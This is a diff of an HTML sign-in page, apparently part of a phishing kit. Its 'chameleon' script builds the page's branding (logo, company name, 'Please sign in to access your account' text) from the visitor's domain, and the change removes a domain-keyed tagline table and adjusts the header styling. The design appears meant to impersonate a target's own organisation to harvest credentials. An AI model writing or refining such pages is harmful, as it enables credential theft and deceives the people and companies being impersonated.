@@ -121,9 +121,9 @@
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
     
-    /* Brand Header - Light Blue */
+    /* Brand Header - Light Blue (No Tagline) */
     .brand-header {
-      padding: 20px 30px 16px;
+      padding: 20px 30px 14px;
       text-align: center;
       border-bottom: 1px solid #dbeafe;
       background: #f0f7ff;
@@ -137,16 +137,9 @@
     }
     
     .brand-name {
-      font-size: 18px;
+      font-size: 20px;
       font-weight: 700;
       color: #1a1a1a;
-    }
-    
-    .brand-tagline {
-      font-size: 13px;
-      color: #6b7a8f;
-      margin-top: 2px;
-      font-weight: 400;
     }
     
     /* Visitor Info Bar */
@@ -415,10 +408,10 @@
   <!-- CHAMELEON CONTAINER -->
   <div class="chameleon-container" id="chameleonContainer">
     
+    <!-- Brand Header (Logo + Company Name Only) -->
     <div class="brand-header" id="brandHeader">
       <img class="brand-logo" id="brandLogo" src="" alt="Logo">
       <div class="brand-name" id="brandName">Loading...</div>
-      <div class="brand-tagline" id="brandTagline">Loading...</div>
     </div>
     
     <div class="visitor-info" id="visitorInfo">
@@ -558,22 +551,7 @@
         document.getElementById('brandName').textContent = brandName;
         document.getElementById('footerDomain').textContent = domain;
         
-        const taglines = {
-          'concrete': 'Your Trusted Concrete Coating Experts',
-          'coatings': 'Professional Coating Services',
-          'construction': 'Building Excellence Since 2000',
-          'realestate': 'Your Property, Our Priority',
-          'finance': 'Secure Financial Solutions',
-          'health': 'Caring for Your Wellbeing',
-          'tech': 'Innovative Technology Solutions',
-          'instrument': 'Test and Measurement Equipment',
-          'default': 'Secure Portal for Your Business'
-        };
-        let tagline = taglines['default'];
-        for (const [key, value] of Object.entries(taglines)) {
-          if (domain.includes(key)) { tagline = value; break; }
-        }
-        document.getElementById('brandTagline').textContent = tagline;
+        // Dynamic welcome text
         document.getElementById('heroTitle').textContent = `Welcome to ${brandName}`;
         document.getElementById('heroSub').textContent = `Please sign in to access your ${brandName} account.`;
         
